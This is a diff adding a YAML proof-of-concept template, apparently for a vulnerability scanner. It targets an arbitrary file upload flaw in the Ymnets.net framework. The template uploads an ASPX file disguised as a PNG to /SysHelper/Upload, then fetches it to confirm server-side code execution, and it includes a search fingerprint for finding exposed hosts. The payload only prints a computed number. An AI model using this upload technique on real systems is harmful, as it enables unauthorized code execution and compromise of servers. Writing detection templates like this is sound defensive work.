@@ -1,0 +1,38 @@
+id: poc-yaml-ymnets-syshelper-upload
+info:
+  name: Ymnets.net框架 Upload 任意文件上传
+  severity: critical
+  tags:
+  - 任意写入
+  finger: Ymnets
+  fofa: body="/Core/verify_code.ashx"
+variables:
+  filename: to_lower(random_str(10))
+  t1: random_int(100,1000)
+  t2: random_int(100,1000)
+  t3: t1 * t2
+requests:
+- method: POST
+  path: /SysHelper/Upload
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryu178FOm4XGgDZqeX
+  data: '------WebKitFormBoundaryu178FOm4XGgDZqeX
+
+    Content-Disposition: form-data; name="Filedata"; filename="{{.filename}}.aspx"
+
+    Content-Type: image/png
+
+
+    <%@ Page Language="C#"%><% Response.Write({{.t1}} * {{.t2}}); %>
+
+    ------WebKitFormBoundaryu178FOm4XGgDZqeX--
+
+    '
+  output:
+  - set_var("filepath",find_json(body,"FilePath"))
+  expression: "status_code == 200 && \ncontains(find_json(body,\"Success\"), \"true\"\
+    )\n"
+- method: GET
+  path: '{{.filepath}}'
+  expression: "status_code == 200 && \nbody == t3\n"
+transport: http
